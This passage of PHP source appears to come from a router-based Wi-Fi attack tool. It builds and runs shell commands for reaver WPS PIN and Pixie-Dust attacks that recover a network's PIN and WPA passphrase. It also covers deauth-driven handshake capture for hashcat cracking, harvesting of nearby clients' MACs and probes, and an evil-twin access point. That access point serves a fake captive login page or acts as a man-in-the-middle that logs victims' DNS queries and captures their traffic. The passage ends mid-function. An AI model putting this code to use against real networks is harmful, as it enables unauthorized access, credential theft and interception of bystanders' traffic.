                $b .= '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ';
            }
            $passBlocks[] = '( ' . $b . ' ) &';
        }

        $script = implode(' ', $passBlocks) . ' wait; echo 0 > ' . $eDone . ';';
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $script . ' ) >/dev/null 2>&1 &'));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    private function startWpsAttackJob($target, $channel, $monitor, $mode, $pin, $timeout)
    {
        if (!$this->ensureWpsStorage()) {
            return self::setError('Unable to create WPS job storage.');
        }

        $jobId = 'attack-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->wpsJobPaths($jobId);
        $bssid = strtolower($target['bssid']);
        $meta = [
            'jobId' => $jobId,
            'type' => 'attack',
            'mode' => $mode,
            'target' => [
                'bssid' => $bssid,
                'ssid' => $target['ssid'] ?? '',
                'channel' => (string)$channel,
                'label' => $target['metadata']['label'] ?? '',
            ],
            'pinProvided' => $pin !== '',
            'timeout' => $timeout,
            'radio' => $monitor['radio'],
            'phy' => $monitor['phy'],
            'band' => $monitor['band'],
            'createdAt' => gmdate('c'),
            'warning' => "WPS attack puts radio {$monitor['radio']} ({$monitor['band']}) into monitor mode for the run. If that radio is the WiFi uplink, internet drops until it finishes.",
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $reaver = trim((string)shell_exec('command -v reaver 2>/dev/null')) ?: 'reaver';
        $mon = 'wpsmon0';
        $manage = !empty($monitor['manageRadio']);
        $ch = (int)$channel;
        $eMon = escapeshellarg($mon);
        $ePhy = escapeshellarg($monitor['phy']);
        $eRadio = escapeshellarg($monitor['radio']);
        $eBssid = escapeshellarg($bssid);
        $eOut = escapeshellarg($paths['out']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);
        $ePid = escapeshellarg($paths['pid']);
        $eStop = escapeshellarg($paths['stop']);

        // reaver: -K 1 = Pixie-Dust; PIN mode = online registrar (optionally a fixed -p PIN); -L ignore locks; -N no NACK; -vv verbose
        // Merge stdout+stderr into one log so the operator sees a single live timeline
        // (reaver sends associations/warnings to stderr and verbose progress to stdout).
        $reaverCmd = escapeshellarg($reaver) . ' -i ' . $eMon . ' -b ' . $eBssid . ' -c ' . $ch . ' -vv -N -L';
        if ($mode === 'pixie') {
            $reaverCmd .= ' -K 1';
        } elseif ($pin !== '') {
            $reaverCmd .= ' -p ' . escapeshellarg($pin);
        }
        $reaverCmd .= ' >> ' . $eOut . ' 2>&1';

        $script = 'iw dev ' . $eMon . ' del 2>/dev/null; ';
        if ($manage) {
            $script .= '/sbin/wifi down ' . $eRadio . ' 2>/dev/null; sleep 3; ';
        }
        $script .= 'if ! iw phy ' . $ePhy . ' interface add ' . $eMon . ' type monitor 2>> ' . $eErr . '; then ';
        $script .= 'echo "[wa] failed to create monitor interface" >> ' . $eErr . '; ';
        if ($manage) {
            $script .= '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ';
        }
        $script .= 'echo 1 > ' . $eDone . '; exit 1; fi; ';
        $script .= 'ip link set ' . $eMon . ' up 2>> ' . $eErr . '; ';
        $script .= 'iw dev ' . $eMon . ' set channel ' . $ch . ' 2>> ' . $eErr . '; ';
        $script .= 'echo "[wa] ' . $mode . ' WPS attack on ' . $bssid . ' ch ' . $ch . ' (hard timeout ' . (int)$timeout . 's)" >> ' . $eOut . '; ';
        $script .= 'START=$(date +%s); ';
        $script .= $reaverCmd . ' & RPID=$!; echo $RPID > ' . $ePid . '; ';
        $script .= 'END=$(( START + ' . (int)$timeout . ' )); TIMEDOUT=0; ';
        $script .= 'while [ $(date +%s) -lt $END ]; do ';
        $script .= 'if [ -f ' . $eStop . ' ]; then echo "[wa] stop requested by operator" >> ' . $eOut . '; break; fi; ';
        $script .= 'if ! kill -0 $RPID 2>/dev/null; then echo "[wa] reaver exited on its own" >> ' . $eOut . '; break; fi; sleep 2; done; ';
        // If the loop fell through because the deadline passed (reaver still alive), say so.
        $script .= 'if kill -0 $RPID 2>/dev/null && [ $(date +%s) -ge $END ]; then TIMEDOUT=1; echo "[wa] hard timeout reached after ' . (int)$timeout . 's — stopping reaver" >> ' . $eOut . '; fi; ';
        // Kill reaver AND any pixiewps child (busybox has no pkill; use pgrep).
        $script .= 'kill $RPID 2>/dev/null; kill $(pgrep -x pixiewps 2>/dev/null) 2>/dev/null; sleep 1; kill -9 $RPID 2>/dev/null; ';
        $script .= 'echo "[wa] run finished (elapsed $(( $(date +%s) - START ))s)" >> ' . $eOut . '; ';
        $script .= 'iw dev ' . $eMon . ' del 2>/dev/null; ';
        if ($manage) {
            $script .= '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ';
        }
        $script .= 'echo 0 > ' . $eDone . ';';

        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $script . ' ) >/dev/null 2>&1 &'));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    private function parseWpsAttackResult($output)
    {
        $output = (string)$output;
        $pin = '';
        $psk = '';
        $ssid = '';
        if (preg_match("/WPS PIN:\s*'?([0-9]{4,8})'?/i", $output, $m)) {
            $pin = $m[1];
        }
        if ($pin === '' && preg_match("/WPS pin:\s*([0-9]{4,8})/i", $output, $m)) {
            $pin = $m[1];
        }
        if (preg_match("/WPA PSK:\s*'([^']*)'/i", $output, $m)) {
            $psk = $m[1];
        }
        if (preg_match("/AP SSID:\s*'([^']*)'/i", $output, $m)) {
            $ssid = $m[1];
        }
        $locked = (bool)preg_match('/WPS (?:transaction|lock)|AP (?:rate limiting|locked)|WARNING.*lock/i', $output);
        return [
            'success' => ($pin !== '' || $psk !== ''),
            'pin' => $pin,
            'psk' => $psk,
            'ssid' => $ssid,
            'locked' => $locked,
        ];
    }

    private function stepEntry($key, $label, $status, $detail)
    {
        // status: pending | active | done | failed | warn | skipped
        return ['key' => $key, 'label' => $label, 'status' => $status, 'detail' => $detail];
    }

    // Turn reaver's live -vv output into an ordered, human-readable step timeline so
    // the operator can see exactly which phase is running and where it stalls.
    private function deriveWpsSteps($log, $err, $pending, $mode, $result)
    {
        $t = (string)$log . "\n" . (string)$err;
        $has = function ($re) use ($t) {
            return (bool)preg_match($re, $t);
        };

        $monitorFail = $has('/failed to create monitor/i');
        $monitorUp = $has('/\[wa\].*WPS attack on|Associated with|Waiting for beacon|Trying pin/i');
        $associated = $has('/Associated with/i');
        $failedAssoc = $has('/Failed to associate/i');
        $tryingPins = $has('/Trying pin|Sending EAPOL|Received M\d|Sending M\d|E-Nonce|Starting Cracking|PKR|PKE/i');
        $pixieRun = $has('/Running pixiewps|Pixie-Dust|\[Pixie/i');
        $pinNotFound = $has('/WPS pin not found|pixiewps.*fail|Pixiewps fail/i');
        $success = !empty($result['pin']) || !empty($result['psk']);

        $steps = [];
        $steps[] = $this->stepEntry(
            'setup',
            'Radio → monitor mode',
            $monitorFail ? 'failed' : ($monitorUp ? 'done' : ($pending ? 'active' : 'failed')),
            $monitorFail ? 'Could not create the monitor interface.' : 'Put the radio into monitor mode and locked onto the target channel.'
        );
        $steps[] = $this->stepEntry(
            'beacon',
            'Find the AP (beacon)',
            $associated ? 'done' : ($monitorUp ? ($pending ? 'active' : 'failed') : 'pending'),
            $associated ? 'Received a beacon from the target.' : 'Listening for the target AP on its channel.'
        );
        $steps[] = $this->stepEntry(
            'assoc',
            'Associate with AP',
            $associated ? 'done' : ($failedAssoc ? ($pending ? 'active' : 'failed') : ($pending ? 'pending' : 'skipped')),
            $associated ? 'Associated with the AP.' : ($failedAssoc ? 'AP is not accepting association — retrying.' : 'Waiting to associate.')
        );

        if ($mode === 'pixie') {
            $steps[] = $this->stepEntry(
                'wps',
                'WPS handshake (collect M1–M3)',
                ($pixieRun || $success) ? 'done' : ($tryingPins ? 'active' : ($associated ? ($pending ? 'active' : 'failed') : 'pending')),
                'Exchanging WPS messages to collect the nonces pixie-dust needs.'
            );
            $steps[] = $this->stepEntry(
                'pixie',
                'Pixie-Dust computation',
                $success ? 'done' : ($pinNotFound ? 'failed' : ($pixieRun ? 'active' : ($pending ? 'pending' : 'skipped'))),
                $pinNotFound ? 'AP is not vulnerable to pixie-dust — no PIN recovered.' : 'Running pixiewps against the collected data.'
            );
        } else {
            $steps[] = $this->stepEntry(
                'wps',
                'Trying WPS PINs (online)',
                $success ? 'done' : ($tryingPins ? 'active' : ($associated ? ($pending ? 'active' : 'failed') : 'pending')),
                'Sending PIN guesses to the AP registrar and reading responses.'
            );
        }

        $steps[] = $this->stepEntry(
            'result',
            'Recover PIN / passphrase',
            $success ? 'done' : ($pending ? 'pending' : 'failed'),
            $success
                ? ('Recovered' . (!empty($result['pin']) ? ' PIN ' . $result['pin'] : '') . (!empty($result['psk']) ? ' / PSK ' . $result['psk'] : '') . '.')
                : 'No key recovered yet.'
        );

        return $steps;
    }

    private function wpsStopReason($log, $err, $result)
    {
        $t = (string)$log . "\n" . (string)$err;
        if (!empty($result['pin']) || !empty($result['psk'])) {
            return ['level' => 'success', 'text' => 'Recovered the WPS credentials.'];
        }
        if (preg_match('/stop requested/i', $t)) {
            return ['level' => 'warn', 'text' => 'Stopped by you.'];
        }
        if (preg_match('/failed to create monitor/i', $t)) {
            return ['level' => 'danger', 'text' => 'Could not put the radio into monitor mode. Free the radio (Lab mode) and retry.'];
        }
        if (preg_match('/Detected AP rate limiting|WPS.*lock|AP (?:locked|rate limiting)/i', $t)) {
            return ['level' => 'danger', 'text' => 'The AP is rate-limiting / locking WPS. It throttles guesses so the attack cannot proceed — most routers lock WPS after a few failed attempts. Wait for the lock to clear, or this AP has WPS lockout protection.'];
        }
        if (preg_match('/WPS pin not found|pixiewps.*fail/i', $t)) {
            return ['level' => 'danger', 'text' => 'Pixie-Dust did not recover the PIN — this AP is not vulnerable to the offline pixie-dust attack. Patched APs are immune. You can try PIN mode (online, slow), but it may be rate-limited.'];
        }
        if (preg_match('/Failed to associate/i', $t) && !preg_match('/Associated with/i', $t)) {
            return ['level' => 'danger', 'text' => 'Could not associate with the AP — out of range, wrong channel, or the AP is not responding. Re-scan to refresh the channel and check signal.'];
        }
        if (preg_match('/receive timeout occurred/i', $t)) {
            return ['level' => 'warn', 'text' => 'Timed out waiting for the AP to respond. It may be far away or busy — try again closer, or raise the timeout.'];
        }
        return ['level' => 'warn', 'text' => 'The attack ended without recovering the PIN (timed out or the AP stopped responding). Try a longer timeout, or PIN mode.'];
    }

    // Step timeline for the PMKID/handshake capture pipeline.
    private function deriveCaptureSteps($log, $err, $pending, $deauth, $result)
    {
        $t = (string)$log . "\n" . (string)$err;
        $has = function ($re) use ($t) {
            return (bool)preg_match($re, $t);
        };

        $monitorFail = $has('/failed to create monitor/i');
        $monitorUp = $has('/\[wa\] monitor up/i');
        $deauthSent = $has('/Sending \d+ directed DeAuth|Sending DeAuth|DeAuth/i');
        $noCapFile = $has('/no capture file was produced/i');
        $converting = $has('/converting capture to hashcat|EAPOL pairs written|written to 22000|PMKID.*written/i');
        $handshake = !empty($result['handshakeCaptured']) || $has('/WPA handshake:/i');
        $hashCount = (int)($result['hashCount'] ?? 0);

        $steps = [];
        $steps[] = $this->stepEntry(
            'setup',
            'Radio → monitor mode',
            $monitorFail ? 'failed' : ($monitorUp ? 'done' : ($pending ? 'active' : 'failed')),
            $monitorFail ? 'Could not create the monitor interface.' : 'Put the radio into monitor mode and locked onto the target channel.'
        );
        $steps[] = $this->stepEntry(
            'listen',
            'Listen for 4-way handshake',
            $handshake ? 'done' : ($monitorUp ? ($pending ? 'active' : 'failed') : 'pending'),
            $handshake ? 'A WPA handshake / PMKID was seen on the air.' : 'airodump-ng is capturing frames on the target BSSID.'
        );
        $steps[] = $this->stepEntry(
            'deauth',
            'Deauth to force a reconnect',
            $deauth ? ($deauthSent ? 'done' : ($pending ? 'active' : 'warn')) : 'skipped',
            $deauth ? 'Sending deauth bursts so a client reconnects and replays the handshake.' : 'Deauth disabled — waiting for a natural client reconnect.'
        );
        $steps[] = $this->stepEntry(
            'convert',
            'Convert to hashcat 22000',
            ($hashCount > 0) ? 'done' : ($noCapFile ? 'failed' : ($converting ? 'active' : ($pending ? 'pending' : 'failed'))),
            ($hashCount > 0) ? ($hashCount . ' hash' . ($hashCount === 1 ? '' : 'es') . ' written.') : 'hcxpcapngtool converts the pcap into crackable hashes.'
        );

        return $steps;
    }

    private function captureStopReason($log, $err, $result)
    {
        $t = (string)$log . "\n" . (string)$err;
        if (!empty($result['handshakeCaptured'])) {
            $n = (int)($result['hashCount'] ?? 0);
            return ['level' => 'success', 'text' => 'Captured ' . $n . ' hash' . ($n === 1 ? '' : 'es') . ' — ready to download / crack.'];
        }
        if (preg_match('/stop requested/i', $t)) {
            return ['level' => 'warn', 'text' => 'Stopped by you.'];
        }
        if (preg_match('/failed to create monitor/i', $t)) {
            return ['level' => 'danger', 'text' => 'Could not put the radio into monitor mode. Free the radio (Lab mode) and retry.'];
        }
        if (preg_match('/no capture file was produced/i', $t)) {
            return ['level' => 'danger', 'text' => 'airodump-ng produced no capture — the monitor may have been on the wrong channel. Re-scan the target to refresh its channel and retry.'];
        }
        return ['level' => 'warn', 'text' => 'No handshake captured — no client re-authenticated during the window. Make sure a device is connected to the target, enable deauth, target a specific client MAC, or use a longer duration.'];
    }

    private function beaconJobDir()
    {
        return $this->storageRoot() . '/beacon';
    }

    private function ensureBeaconStorage()
    {
        return $this->ensureDir($this->beaconJobDir());
    }

    private function beaconJobPaths($jobId)
    {
        $base = $this->beaconJobDir() . '/' . $jobId;
        return [
            'meta' => $base . '.json',
            'cap' => $base . '-01.cap',
            'csv' => $base . '-01.csv',
            'out' => $base . '.out',
            'err' => $base . '.err',
            'done' => $base . '.done',
            'pid' => $base . '.pid',
            'stop' => $base . '.stop',
        ];
    }

    private function startBeaconHarvestJob($band, $passes, $duration)
    {
        if (!$this->ensureBeaconStorage()) {
            return self::setError('Unable to create harvest job storage.');
        }

        $jobId = 'harvest-' . gmdate('YmdHis') . '-' . mt_rand(1000, 9999);
        $paths = $this->beaconJobPaths($jobId);
        $anyManage = false;
        foreach ($passes as $p) {
            $anyManage = $anyManage || !empty($p['monitor']['manageRadio']);
        }
        $meta = [
            'jobId' => $jobId,
            'band' => $band,
            'bands' => array_map(function ($p) { return $p['monitor']['band']; }, $passes),
            'radio' => implode(',', array_map(function ($p) { return $p['monitor']['radio']; }, $passes)),
            'phy' => implode(',', array_map(function ($p) { return $p['monitor']['phy']; }, $passes)),
            'duration' => $duration,
            'createdAt' => gmdate('c'),
            'warning' => $anyManage
                ? 'Harvest puts a radio into monitor mode; if it is the uplink, internet drops until it finishes.'
                : 'Harvest uses free radios with no uplink impact.',
        ];
        @file_put_contents($paths['meta'], json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

        $airodump = trim((string)shell_exec('command -v airodump-ng 2>/dev/null')) ?: 'airodump-ng';
        $eOut = escapeshellarg($paths['out']);
        $eErr = escapeshellarg($paths['err']);
        $eDone = escapeshellarg($paths['done']);
        $eStop = escapeshellarg($paths['stop']);
        $jobBase = $this->beaconJobDir() . '/' . $jobId;

        // One concurrent monitor pass per band, each with its own vif + cap/csv set.
        $passBlocks = [];
        foreach ($passes as $p) {
            $monitor = $p['monitor'];
            $manage = !empty($monitor['manageRadio']);
            $eMon = escapeshellarg($p['mon']);
            $ePhy = escapeshellarg($monitor['phy']);
            $eRadio = escapeshellarg($monitor['radio']);
            $ePrefix = escapeshellarg($jobBase . $p['capSuffix']);
            $b = 'iw dev ' . $eMon . ' del 2>/dev/null; ';
            if ($manage) {
                $b .= '/sbin/wifi down ' . $eRadio . ' 2>/dev/null; sleep 3; ';
            }
            $b .= 'if ! iw phy ' . $ePhy . ' interface add ' . $eMon . ' type monitor 2>> ' . $eErr . '; then ';
            $b .= 'echo "[wa] failed to create monitor interface on ' . $monitor['phy'] . '" >> ' . $eErr . '; ';
            if ($manage) {
                $b .= '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ';
            }
            $b .= 'exit 1; fi; ';
            $b .= 'ip link set ' . $eMon . ' up 2>> ' . $eErr . '; ';
            $b .= 'echo "[wa] beacon harvest on phy ' . $monitor['phy'] . ' (' . $monitor['band'] . ')" >> ' . $eOut . '; ';
            $b .= escapeshellarg($airodump) . ' --band ' . $p['airBand'] . ' -w ' . $ePrefix . ' --output-format pcap,csv ' . $eMon . ' >> ' . $eOut . ' 2>> ' . $eErr . ' & APID=$!; ';
            $b .= 'END=$(( $(date +%s) + ' . (int)$duration . ' )); ';
            $b .= 'while [ $(date +%s) -lt $END ]; do if [ -f ' . $eStop . ' ]; then break; fi; sleep 2; done; ';
            $b .= 'kill $APID 2>/dev/null; sleep 1; kill -9 $APID 2>/dev/null; ';
            $b .= 'iw dev ' . $eMon . ' del 2>/dev/null; ';
            if ($manage) {
                $b .= '/sbin/wifi up ' . $eRadio . ' 2>/dev/null; ';
            }
            $passBlocks[] = '( ' . $b . ' ) &';
        }

        $script = implode(' ', $passBlocks) . ' wait; echo 0 > ' . $eDone . ';';
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $script . ' ) >/dev/null 2>&1 &'));

        return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
    }

    private function parseAirodumpCsv($csv)
    {
        $aps = [];
        $clients = [];
        $csv = str_replace("\r", '', (string)$csv);
        $lines = explode("\n", $csv);
        $section = 'none';
        foreach ($lines as $line) {
            $trim = trim($line);
            if ($trim === '') {
                continue;
            }
            if (strpos($trim, 'BSSID,') === 0 && stripos($trim, 'First time seen') !== false) {
                $section = 'ap';
                continue;
            }
            if (strpos($trim, 'Station MAC,') === 0) {
                $section = 'client';
                continue;
            }

            $cols = array_map('trim', explode(',', $line));
            if ($section === 'ap') {
                if (count($cols) < 14 || !$this->isSafeBssid(strtolower($cols[0]))) {
                    continue;
                }
                $bssid = strtolower($cols[0]);
                $privacy = $cols[5];
                $cipher = $cols[6];
                $auth = $cols[7];
                $security = trim($privacy);
                if ($security === '' || strtoupper($security) === 'OPN') {
                    $security = 'Open';
                } else {
                    $security = trim($privacy . ($cipher !== '' ? ' ' . $cipher : '') . ($auth !== '' ? ' ' . $auth : ''));
                }
                $essid = isset($cols[13]) ? $cols[13] : '';
                $aps[] = [
                    'bssid' => $bssid,
                    'channel' => (string)((int)$cols[3]),
                    'security' => $security,
                    'signal' => ($cols[8] !== '' ? $cols[8] . ' dBm' : ''),
                    'beacons' => (int)($cols[9] ?? 0),
                    'ssid' => $this->cleanSsid($essid),
                ];
            } elseif ($section === 'client') {
                if (count($cols) < 6 || !$this->isSafeBssid(strtolower($cols[0]))) {
                    continue;
                }
                $mac = strtolower($cols[0]);
                $assoc = strtolower($cols[5]);
                $associated = $this->isSafeBssid($assoc) ? $assoc : '';
                $probes = [];
                if (isset($cols[6])) {
                    for ($i = 6; $i < count($cols); $i++) {
                        $probe = trim($cols[$i]);
                        if ($probe !== '') {
                            $probes[] = $probe;
                        }
                    }
                }
                $clients[] = [
                    'mac' => $mac,
                    'bssid' => $associated,
                    'signal' => ($cols[3] !== '' ? $cols[3] . ' dBm' : ''),
                    'packets' => (int)($cols[4] ?? 0),
                    'probes' => $probes,
                ];
            }
        }
        return ['aps' => $aps, 'clients' => $clients];
    }

    private function mergeBeaconResults($aps, $clients)
    {
        if (!$this->ensureStorage()) {
            return false;
        }
        $db = $this->readReconDatabase();
        $timestamp = gmdate('c');

        foreach ($aps as $ap) {
            $bssid = strtolower($ap['bssid']);
            if ($bssid === '') {
                continue;
            }
            $existing = isset($db['targets'][$bssid]) && is_array($db['targets'][$bssid]) ? $db['targets'][$bssid] : [];
            $metadata = isset($existing['metadata']) && is_array($existing['metadata']) ? $existing['metadata'] : $this->normalizeTargetMetadata([]);
            $merged = array_merge($existing, [
                'bssid' => $bssid,
                'ssid' => ($ap['ssid'] !== '' && $ap['ssid'] !== '<hidden>') ? $ap['ssid'] : ($existing['ssid'] ?? $ap['ssid']),
                'channel' => $ap['channel'] !== '' && $ap['channel'] !== '0' ? $ap['channel'] : ($existing['channel'] ?? ''),
                'security' => $ap['security'] !== '' ? $ap['security'] : ($existing['security'] ?? 'Open'),
                'signal' => $ap['signal'] !== '' ? $ap['signal'] : ($existing['signal'] ?? ''),
                'firstSeenAt' => $existing['firstSeenAt'] ?? $timestamp,
                'lastSeenAt' => $timestamp,
                'seenCount' => isset($existing['seenCount']) ? (int)$existing['seenCount'] + 1 : 1,
                'metadata' => $metadata,
                'metadataUpdatedAt' => $existing['metadataUpdatedAt'] ?? '',
            ]);
            if (isset($ap['wps'])) {
                $merged['wps'] = array_merge(['updatedAt' => $timestamp], $ap['wps']);
            }
            $db['targets'][$bssid] = $merged;
        }

        if (!isset($db['clients']) || !is_array($db['clients'])) {
            $db['clients'] = [];
        }
        foreach ($clients as $client) {
            $mac = strtolower($client['mac']);
            if ($mac === '') {
                continue;
            }
            $existing = isset($db['clients'][$mac]) && is_array($db['clients'][$mac]) ? $db['clients'][$mac] : [];
            $probes = array_values(array_unique(array_merge(
                isset($existing['probes']) && is_array($existing['probes']) ? $existing['probes'] : [],
                $client['probes']
            )));
            $db['clients'][$mac] = [
                'mac' => $mac,
                'bssid' => $client['bssid'] !== '' ? $client['bssid'] : ($existing['bssid'] ?? ''),
                'signal' => $client['signal'] !== '' ? $client['signal'] : ($existing['signal'] ?? ''),
                'packets' => (int)($client['packets']) + (int)($existing['packets'] ?? 0),
                'probes' => array_slice($probes, 0, 20),
                'firstSeenAt' => $existing['firstSeenAt'] ?? $timestamp,
                'lastSeenAt' => $timestamp,
            ];
        }
        // Cap the client table so the DB stays bounded.
        if (count($db['clients']) > 400) {
            uasort($db['clients'], function ($a, $b) {
                return strcmp($b['lastSeenAt'] ?? '', $a['lastSeenAt'] ?? '');
            });
            $db['clients'] = array_slice($db['clients'], 0, 400, true);
        }

        $db['updatedAt'] = $timestamp;
        return $this->writeReconDatabase($db);
    }

    private function evilPortalDir()
    {
        return '/tmp/evilportal';
    }

    private function readEvilPortalState()
    {
        $path = $this->evilPortalDir() . '/state.json';
        if (!is_file($path)) {
            return ['running' => false];
        }
        $decoded = json_decode((string)@file_get_contents($path), true);
        return is_array($decoded) ? $decoded : ['running' => false];
    }

    private function writeEvilPortalState($state)
    {
        @file_put_contents($this->evilPortalDir() . '/state.json', json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    }

    private function isEvilPortalRunning()
    {
        $pidFile = $this->evilPortalDir() . '/hostapd.pid';
        if (!is_file($pidFile)) {
            return false;
        }
        $pid = (int)trim((string)@file_get_contents($pidFile));
        if ($pid <= 0) {
            return false;
        }
        return file_exists("/proc/{$pid}");
    }

    private function findHandshakeCap($bssid)
    {
        $dir = $this->captureJobDir();
        if (!is_dir($dir)) {
            return '';
        }
        $best = '';
        $bestId = '';
        foreach (glob($dir . '/*.json') as $metaPath) {
            $meta = json_decode((string)@file_get_contents($metaPath), true);
            if (!is_array($meta)) {
                continue;
            }
            $mb = strtolower($meta['target']['bssid'] ?? '');
            if ($mb !== $bssid) {
                continue;
            }
            $jobId = basename($metaPath, '.json');
            $cap = $dir . '/' . $jobId . '-01.cap';
            if (is_file($cap) && filesize($cap) > 0 && strcmp($jobId, $bestId) > 0) {
                $best = $cap;
                $bestId = $jobId;
            }
        }
        return $best;
    }

    private function sanitizeSsidForConf($ssid)
    {
        $ssid = preg_replace('/[\x00-\x1F\x7F]/', '', (string)$ssid);
        return substr($ssid, 0, 32);
    }

    private function launchEvilPortal($bssid, $ssid, $channel, $monitor, $verifyCap, $band = '2g', $internet = false, $uplinkDev = '', $template = 'wifi', $customHtml = '')
    {
        $rt = $this->evilPortalDir();
        $www = $rt . '/www';
        // Fresh runtime tree.
        shell_exec('/bin/rm -rf ' . escapeshellarg($rt) . ' 2>/dev/null');
        @mkdir($www . '/cgi-bin', 0755, true);
        if (!is_dir($www . '/cgi-bin')) {
            return self::setError('Unable to create Evil Portal runtime directory.');
        }

        $safeSsid = $this->sanitizeSsidForConf($ssid);
        $hasVerify = false;
        if ($verifyCap !== '' && is_file($verifyCap)) {
            @copy($verifyCap, $rt . '/verify.cap');
            $hasVerify = is_file($rt . '/verify.cap');
        }

        // hostapd (open twin AP). 2.4GHz uses hw_mode=g; 5GHz uses hw_mode=a and
        // needs a regulatory country + 802.11d so the driver accepts the channel.
        if ($band === '5g') {
            $cc = trim((string)shell_exec("iw reg get 2>/dev/null | awk '/^country/{print substr($2,1,2); exit}'"));
            if (!preg_match('/^[A-Z]{2}$/', $cc)) {
                $cc = 'US';
            }
            $hostapdConf = "interface=evtwin0\ndriver=nl80211\nssid={$safeSsid}\n"
                . "hw_mode=a\nchannel={$channel}\ncountry_code={$cc}\nieee80211d=1\nieee80211h=0\n"
                . "auth_algs=1\nignore_broadcast_ssid=0\nwmm_enabled=1\n";
        } else {
            $hostapdConf = "interface=evtwin0\ndriver=nl80211\nssid={$safeSsid}\nhw_mode=g\nchannel={$channel}\nauth_algs=1\nignore_broadcast_ssid=0\nwmm_enabled=1\n";
        }
        @file_put_contents($rt . '/hostapd.conf', $hostapdConf);

        // DHCP/DNS for the twin. BOTH modes run a DEDICATED dnsmasq bound to evtwin0
        // (captive hijacks every name to the portal; passthrough hands out DHCP and
        // forwards real DNS while logging queries). The box's main dnsmasq is only
        // told to leave evtwin0 alone. We deliberately do NOT push a DHCP/log config
        // into the main dnsmasq: on OpenWrt 24.10 it runs inside a procd ujail that
        // cannot see /tmp/evilportal, so a log-facility there crash-loops it and
        // takes down the whole box's DNS. A separately-launched dnsmasq is unjailed.
        $twinLeases = $rt . '/twin.leases';
        $confDir = trim((string)shell_exec("grep -h '^conf-dir=' /var/etc/dnsmasq.conf.* 2>/dev/null | head -1 | sed 's/^conf-dir=//; s/,.*//'"));
        $fragment = '';
        if ($confDir !== '' && is_dir($confDir)) {
            $fragment = $confDir . '/wa-evilportal.conf';
            @file_put_contents($fragment, "except-interface=evtwin0\n");
        }

        // Pre-create the DNS query log so the traffic view can read it even before
        // the first query (world-writable in case dnsmasq drops privileges).
        if ($internet) {
            @file_put_contents($rt . '/dns.log', '');
            @chmod($rt . '/dns.log', 0666);
        }

        $this->writePortalAssets($www, $bssid, $safeSsid, $hasVerify, $template, $customHtml);

        // Bring up the AP vif, addressing, and services. This prefix is identical for
        // both the captive-portal and the internet-passthrough modes.
        $common =
            'iw dev evtwin0 del 2>/dev/null; ' .
            'iw phy ' . escapeshellarg($monitor['phy']) . ' interface add evtwin0 type __ap 2>> ' . escapeshellarg($rt . '/setup.err') . ' || exit 1; ' .
            'ip addr flush dev evtwin0 2>/dev/null; ' .
            'ip addr add 10.0.0.1/24 dev evtwin0; ' .
            'ip link set evtwin0 up; ' .
            'hostapd -B -P ' . escapeshellarg($rt . '/hostapd.pid') . ' ' . escapeshellarg($rt . '/hostapd.conf') . ' >> ' . escapeshellarg($rt . '/hostapd.log') . ' 2>&1; ' .
            '/etc/init.d/dnsmasq restart >/dev/null 2>&1; ';

        if ($internet) {
            // Real-internet MITM: NAT the twin subnet out through the uplink so clients
            // get genuine connectivity while we sit in the middle. A rolling tcpdump on
            // evtwin0 captures the transit traffic; a dedicated dnsmasq serves DHCP,
            // forwards DNS to the real upstream, and logs every domain each client
            // resolves (used by the Traffic view).
            $resolvArg = is_file('/tmp/resolv.conf.d/resolv.conf.auto')
                ? '--resolv-file=/tmp/resolv.conf.d/resolv.conf.auto'
                : '--no-resolv --server=1.1.1.1';
            $up = escapeshellarg($uplinkDev);
            $mode =
                'dnsmasq --conf-file=/dev/null --no-hosts --bind-interfaces '
                    . '--interface=evtwin0 --except-interface=lo --listen-address=10.0.0.1 '
                    . '--dhcp-range=10.0.0.50,10.0.0.150,255.255.255.0,12h '
                    . '--dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1 --dhcp-authoritative '
                    . '--dhcp-leasefile=' . escapeshellarg($twinLeases) . ' ' . $resolvArg . ' '
                    . '--log-queries --log-facility=' . escapeshellarg($rt . '/dns.log') . ' '
                    . '--pid-file=' . escapeshellarg($rt . '/dnsmasq.pid') . ' >> ' . escapeshellarg($rt . '/dnsmasq.log') . ' 2>&1; ' .
                'sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; ' .
                'nft add table inet evilportal 2>/dev/null; ' .
                'nft add chain inet evilportal postrt "{ type nat hook postrouting priority 100 ; }" 2>/dev/null; ' .
                'nft add rule inet evilportal postrt ip saddr 10.0.0.0/24 oifname ' . $up . ' masquerade 2>/dev/null; ' .
                'nft insert rule inet fw4 forward iifname evtwin0 oifname ' . $up . ' accept 2>/dev/null; ' .
                'nft insert rule inet fw4 forward iifname ' . $up . ' oifname evtwin0 accept 2>/dev/null; ' .
                'nft insert rule inet fw4 input iifname evtwin0 accept 2>/dev/null; ' .
                'tcpdump -i evtwin0 -n -s 160 -W 3 -C 2 -w ' . escapeshellarg($rt . '/cap.pcap') . ' >/dev/null 2>&1 & echo $! > ' . escapeshellarg($rt . '/tcpdump.pid') . '; ' .
                'true';
        } else {
            // Captive portal. Dedicated dnsmasq on evtwin0: DHCP + DNS hijack (every
            // name -> 10.0.0.1) so the OS probe reaches us and the sheet auto-pops.
            // uhttpd serves the login page; nft redirects the probe's port 80 to it.
            $eLeases = escapeshellarg($twinLeases);
            $eDnsPid = escapeshellarg($rt . '/dnsmasq.pid');
            $eDnsLog = escapeshellarg($rt . '/dnsmasq.log');
            $mode =
                'dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --bind-interfaces '
                    . '--interface=evtwin0 --except-interface=lo --listen-address=10.0.0.1 '
